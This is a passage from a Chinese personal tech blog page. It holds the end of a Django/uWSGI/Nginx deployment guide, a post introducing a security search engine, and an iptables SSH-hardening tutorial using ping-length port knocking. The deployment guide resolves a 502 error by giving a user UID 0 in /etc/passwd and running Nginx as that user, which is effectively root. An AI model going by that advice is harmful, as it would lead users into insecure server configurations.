Nginx编码</span><br><span class="line">    gzip_types text/plain application/x-javascript text/css text/javascript application/x-httpd-php application/json text/json image/jpeg image/gif image/png application/octet-stream; # 支持压缩的类型</span><br><span class="line"></span><br><span class="line">    error_page 404 /404.html; # 错误页面</span><br><span class="line">    error_page 500 502 503 504 /50x.html; # 错误页面</span><br><span class="line"></span><br><span class="line">    # 指定项目路径uwsgi</span><br><span class="line">    location / &#123;</span><br><span class="line">        # uwsgi_params在nginx文件夹下</span><br><span class="line">        include /etc/nginx/uwsgi_params; </span><br><span class="line">        # 设置连接uWSGI超时时间</span><br><span class="line">        uwsgi_connect_timeout 30; </span><br><span class="line">        # nginx与uwsgi的通信方式，动态请求会通过sock传递给uwsgi处理</span><br><span class="line">        uwsgi_pass unix:/root/django/uwsgi/uwsgi.sock; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 这里使用上面收集的静态文件夹目录</span><br><span class="line">    location /static/ &#123;</span><br><span class="line">    alias /root/django/static/;</span><br><span class="line">    index index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a><a name="5"></a>启动服务</h3><p>&emsp;&emsp;接下来我们启动uwsgi，进入刚才新建的uwsgi文件夹，通过配置文件启动uwsgi：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --ini uwsgi.ini</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;执行后会在该文件夹下生成uwsgi.log用来记录uwsgi日志，我们可以先查看一下该文件，以保证我们的uwsgi服务是正常的。</p>
+<p>&emsp;&emsp;然后我们启动nginx：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;现在通过域名（如果你上面配置的是域名，否则使用IP）访问网站，看是否正常运行。如果你能成功运行那么恭喜你，你可以不用往下看了，如果你出现了一些错误，那么可以借鉴我的解决思路。再附上关闭uwsgi服务和nginx的命令：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">killall -9 uwsgi</span><br><span class="line">service nginx stop</span><br></pre></td></tr></table></figure></p>
+<h3 id="部署中遇到的问题及解决方案"><a href="#部署中遇到的问题及解决方案" class="headerlink" title="部署中遇到的问题及解决方案"></a><a name="6"></a>部署中遇到的问题及解决方案</h3><p>&emsp;&emsp;这里我访问网站后发现是<code>502</code>错误，这也是我遇到的一个大坑，很多博客都没有解释和解决掉这个问题。</p>
+<p>&emsp;&emsp;出现502后查看日志文件：<code>cat /var/log/nginx/access.log</code>，发现是权限问题，原来nginx默认是<code>www-data</code>用户运行，但该用户没有权限访问<code>root</code>下的目录文件，所以导致服务器出现错误。所以我们需要以<code>root</code>身份运行，但root实在是太敏感，所以上面专门添加的用户<code>junay</code>就起作用了。</p>
+<p>&emsp;&emsp;首先我们修改junay的权限，通过：<code>vim /etc/passwd</code>，将juany修改成如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junay:x:0:0:,,,:/home/junay:/usr/bin/git-shell</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里我们将junay的默认shell设成git-shell，防止该用户登陆bash，其次，我们再修改<code>/etc/ssh/sshd_config</code>，在该文件中添加如下两行，禁止junay使用ssh。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowUsers root</span><br><span class="line">DenyUsers junay</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;最后我们修改nginx的默认用户，改配置文件为<code>/etc/nginx/nginx.conf</code>，将它的user一行改为：</p>
+<p><div align="center"><br>    <img src="/images/posts/other/14.png"><br></div><br>&emsp;&emsp;修改完成后，我们重新启动nginx，使用：<code>service nginx restart</code>，现在我们就成功的完成了django的部署。如果你还是出现了问题，那么请仔细查看<code>uwsgi和nginx的日志文件</code>。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-24T15:00:00.000Z">2017-12-24</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 835 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/security-search/">“黑塔”-一款专注于网络安全的垂直搜索引擎</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>&emsp;&emsp;这个项目，<a href="https://www.secsearch.top" target="_blank" rel="noopener">项目地址</a>，暂且称为<code>“黑塔”</code>，愿景是能够成为网络安全中的一座灯塔，为<code>寻路</code>的人提供方向。它是一款专注于<code>网络安全</code>的<code>垂直搜索引擎</code>。  </p>
+<p>&emsp;&emsp;一开始想到这个项目的初衷是锻炼自己的开发能力，以及方便自己需要的时候查找资料。但在后来，作者发现网上<code>还没有</code>一款专注于网络安全的垂直搜索引擎，遂萌发自己打造一款引擎。也许有人会觉得百度、Google等主流搜索引擎那么强大，哪还需要自己专门开发一款垂直搜索引擎，但事实上并非如此，这里不是说它们不够强大，而是从<code>另一个角度</code>思考问题，Google等搜索引擎包罗万象，体积庞大，很多时候无法收录全面，并且更新存在比较大的延迟，这对信息新鲜度要求极高的网安领域来说是一个缺陷，加之很多大佬的优质博客根本没有做所谓的SEO优化，导致即使被搜索引擎收录，其排名也比较低下，用户需要特别注意才能发觉。  </p>
+<p>&emsp;&emsp;而作为垂直搜索引擎，它拥有<code>短小精悍</code>、<code>更新速度快</code>、<code>信息来源准确</code>的特点，它能够给用户提供<code>新鲜</code>、<code>准确</code>、<code>原创</code>的信息，这就是垂直搜索引擎存在的意义。  </p>
+<p>&emsp;&emsp;“黑塔”的收录信息主要来源于网络安全领域各大佬的<code>博客</code>、<code>安全论坛</code>等专业、可信的信息源，所以，在这里，你能得到更加<code>准确</code>、<code>新鲜</code>的信息，要知道，在网安领域，一个<code>漏洞</code>或<code>EXP</code>晚一小时到你手里所产生的影响都是不同的。“黑塔”的另一个特点就是对<code>新手</code>朋友帮助较大，<code>刚入门</code>或还在<code>入门阶段</code>的人可以把“黑塔”作为<code>增加知识储备</code>的手段，这里有着各网安大佬的原创文章、实战记录，潜心阅读并加以复现对提高自己的技术水平是很有帮助的。  </p>
+<p>&emsp;&emsp;目前，“黑塔”的开发工作仍在继续，<code>不管</code>它是否能受到用户欢迎，<code>也不管</code>它的用户量能有多大，作者都将<code>继续</code>完善、丰富它，以此作为作者增加开发经验、学习网安技术的手段。如果你有好的建议、想法或者本站的漏洞，也欢迎联系我，我相信你能找到我的联系方式。</p>
+<p>&emsp;&emsp;最后，希望大家能在<code>光怪陆离</code>、<code>包罗万象</code>的“黑客世界”中找到属于自己的路，也希望“黑塔”能在你成长的过程中给予你帮助，在这个充满<code>黑、白、灰</code>的世界中，<strong>坚持初心</strong>，<strong>不越雷池</strong>，才能<strong>方得始终</strong>。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-22T16:00:00.000Z">2017-12-23</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    12 分钟 读完 (大约 1798 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/iptables/">通过iptables配置加强服务器安全</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="绪言"><a href="#绪言" class="headerlink" title="绪言"></a>绪言</h2><p>&emsp;&emsp;VPS在公网上使用得越来越多，如何提高自己的服务器安全也变得重要起来，特别是脚本横飞的时代，如果不对服务器加以修饰，每天<code>lastb</code>的记录都能增加很多。而且对外提供越多的服务意味着暴露的缺陷就越多，所以掌握<code>iptables</code>的基本使用中解决很多问题。</p>
+<h3 id="主动模式"><a href="#主动模式" class="headerlink" title="主动模式"></a>主动模式</h3><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;首先对自己<code>主动</code>发送的请求进行响应的报文放行，这里尤其注意是对自己已发送的报文进行响应，如果是其他客户端发送过来的请求连接这里不做处理，使用<code>默认的</code>或后续的匹配策略处理。<br>因为在iptables看来每个协议都有<code>建立连接</code>的概念，包括“udp”、“icmp”。<code>state</code>支持的状态有：NEW、ESTABLISHED、RELATED、INVALID、UNTRACKED。</p>
+<ul>
+<li>NEW：就是双方进行通信时第一个到来的报文；</li>
+<li>ESTABLISHED：state把NEW以后到来的报文都定义为ESTABLISHED状态，包括UDP等，所以说state是有类似于tcp三次握手建立连接的概念；</li>
+<li>RELATED：在一个服务中，可能开启了两个进程，而且这两个进程都需要跟服务器进行通信，例如FTP有两个通信链路，命令链路和传输数据的链路，这两个链路就是存在关系的，所以他们属于RELATED状态；</li>
+<li>INVALID：表示一个包不能被识别；</li>
+<li>UNTRACKED：表示报文不能被追踪；</li>
+</ul>
+<h3 id="为SSH加固"><a href="#为SSH加固" class="headerlink" title="为SSH加固"></a>为SSH加固</h3><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -m length --length 128 -m recent --set --name SSH --rsource -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<code>length</code>模块用于匹配报文长度，这里我们用ping报文的长度来充当芝麻开门的作用，<code>recent</code>模块功能很强，能将匹配到的报文信息记录下来，给后续规则做条件使用。它的几个参数为：</p>
+<ul>
+<li>—name： 给用来记录报文的列表起名称；（这里应该是两个-）</li>
+<li>—set： 表示将匹配到的报文记录下来；</li>
+<li>—rsource: 表示记录源IP地址；</li>
+</ul>
+<p>&emsp;&emsp;这条指令的意思是：将ping报文长度为128的源IP地址记录到叫SSH的列表中去。这里需要注意的是ping报文头部长度就有28字节，所以实际的填充报文为：128-28=100。所以在Linux下使用<code>ping -s 100 ip</code>；在Windows下使用<code>ping -l 100 ip</code>来敲开服务器大门。</p>
+<p>&emsp;&emsp;相关的icmp报文的类型如下（因为ssh客户端是ping的请求方（发起方），所以这里要匹配类型为8的报文）：</p>
+<table>
+<thead>
+<tr>
+<th>类型代码</th>
+<th>类型描述               </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>响应应答（ECHO-REPLY）  </td>
+</tr>
+<tr>
+<td>3</td>
+<td>不可到达                </td>
+</tr>
+<tr>
+<td>4</td>
+<td>源抑制                  </td>
+</tr>
+<tr>
+<td>5</td>
+<td>重定向                 </td>
+</tr>
+<tr>
+<td>8</td>
+<td>响应请求（ECHO-REQUEST）</td>
+</tr>
+<tr>
+<td>11</td>
+<td>超时                    </td>
+</tr>
+<tr>
+<td>12</td>
+<td>参数失灵                 </td>
+</tr>
+<tr>
+<td>13</td>
+<td>时间戳请求               </td>
+</tr>
+<tr>
+<td>14</td>
+<td>时间戳应答               </td>
+</tr>
+<tr>
+<td>15</td>
+<td>信息请求（*已作废）       </td>
+</tr>
+<tr>
+<td>16</td>
+<td>信息应答（*已作废）       </td>
+</tr>
+<tr>
+<td>17</td>
+<td>地址掩码请求              </td>
+</tr>
+<tr>
+<td>18</td>
+<td>地址掩码应答             </td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 8888 -m state --state NEW -m recent --rcheck --seconds 20 --name SSH --rsource -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;8888是ssh修改后的端口号，这里之所以匹配NEW状态是因为后面我们需要对INPUT使用<code>白名单</code>策略，而NEW之后的状态在前面已经放行，所以这里需要对NEW状态进行放行。这里再对recent的两个参数进行说明：</p>
+<ul>
+<li>—rcheck： 检查源IP是否在列表中，以第一个匹配开始计算时间</li>
+<li>—seconds： 记录的源IP地址的有效时间</li>
+</ul>
+<p>&emsp;&emsp;所以这一整句话是说对NEW（新建）状态下请求8888端口的源IP进行检查，看这个IP是否在名叫SSH的列表之中，有效时间是20秒，这里的有效时间是指上一条规则记录下源IP的时间离用户请求SSH服务器的时间间隔。所以用户必须在ping完的20秒内连接客户端，否则连接失败，重新ping。</p>
+<pre><code>PS： 如果是私有的git服务器的话，也同样适用这套规则，登陆或clone、push前都需要进行特殊的操作，这就能很好的保护数据和服务器的安全问题。不要以为这是弱智的问题，，这两天逛tools的时候就有人的git服务器被人攻破。。。
+</code></pre><h3 id="将INPUT策略改成白名单模式"><a href="#将INPUT策略改成白名单模式" class="headerlink" title="将INPUT策略改成白名单模式"></a>将INPUT策略改成白名单模式</h3><p>&emsp;&emsp;白名单是<code>只接受自己信任</code>的来源，而对非信任区来源采用拒绝策略；黑名单则只拒绝自己不信任的来源，接受<code>信任或目的不明确</code>的来源。所以采用白名单的策略系统的安全性较高，而黑名单难免会有疏忽。</p>
+<p>&emsp;&emsp;要使用白名单，只需将INPUT的默认策略从ACCEPT改成DROP。可以使用<code>iptables -P DROP</code>,但如果一不小心清空了<code>ACCEPT</code>的规则，那么服务器将按照默认drop的策略拒绝所有的连接，导致服务器失联。所以我们使用另一种较为安全的策略：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;我们在INPUT链的最后一条上加上<code>DROP</code>规则，这样即使我们不小心<code>iptables -F INPUT</code>清除掉INPUT规则也不用担心服务器失联。</p>
+<p>&emsp;&emsp;值得一提的是，由于采用了DROP策略，所以ping只接收长度为100的报文，也就是说正常的ping是<code>不会被服务器接收</code>的，这就提供了保护主机的安全的方法，相当于把主机从公网中<code>隐藏</code>起来，只有知道口令的人才能找得到。</p>
+<h3 id="保存iptables配置"><a href="#保存iptables配置" class="headerlink" title="保存iptables配置"></a>保存iptables配置</h3><p>&emsp;&emsp;笔者主机为：Ubuntu 16.04，首先安装：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install iptables-persistent</span><br><span class="line">apt install netfilter-persistent    # ubuntu 14.04可以不用</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;保存：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netfilter-persistent save</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;在/etc/rc.local中添加开机时自动执行恢复操作：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netfilter-persistent reload</span><br></pre></td></tr></table></figure></p>
+<h3 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h3><p>&emsp;&emsp;这里只是简单的在INPUT中加固了ssh连接，但对其他类似web的服务没有讲解，但这并不是说iptables对这些服务没有办法，相反，iptables能很好的加强系统安全。比如有些服务不想暴露给外部直接访问，只允许本地处理。这时我们就能使用类似于这样的规则：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT ! -s 127.0.0.1 -j DROP</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;通过配置iptables还可以在有限程度上防止<code>CC攻击</code>、<code>DDOS</code>等攻击，它可用的一些模块还有：</p>
+<ul>
+<li>string： 可以匹配链路中出现的特定字符；</li>
+<li>time： 对链路的时间规则；</li>
+<li>limit： 对IP的并发限制；</li>
+</ul>
+<p>这在后续博文中可能有所涉及。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+    
+<div class="card card-transparent">
+    <nav class="pagination is-centered" role="navigation" aria-label="pagination">
+        <div class="pagination-previous">
+            <a class="is-flex-grow has-text-black-ter" href="/categories/jekyll-update/">上一页</a>
+        </div>
+        <div class="pagination-next">
+            <a class="is-flex-grow has-text-black-ter" href="/categories/jekyll-update/page/3/">下一页</a>
+        </div>
+        <ul class="pagination-list is-hidden-mobile">
+            
+            <li><a class="pagination-link has-text-black-ter" href="/categories/jekyll-update/">1</a></li>
+            
+            <li><a class="pagination-link is-current" href="/categories/jekyll-update/page/2/">2</a></li>
+            
+            <li><a class="pagination-link has-text-black-ter" href="/categories/jekyll-update/page/3/">3</a></li>
+            
+        </ul>
+    </nav>
+</div>
+</div>
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Junay">
+                    
+                    <p class="is-size-4 is-block">
+                        Junay
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Junay&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Shanghai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        56
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        18
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/delcoding">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/delcoding">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="http://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="http://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="http://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">7</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/jekyll-update/">
+            <span class="level-start">
+                <span class="level-item">jekyll update</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">27</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/bypass-pie/" style="font-size: 10px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
+    </div>
+</div>
+
+    
+    
+        <div class="card card-transparent is-hidden-widescreen">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
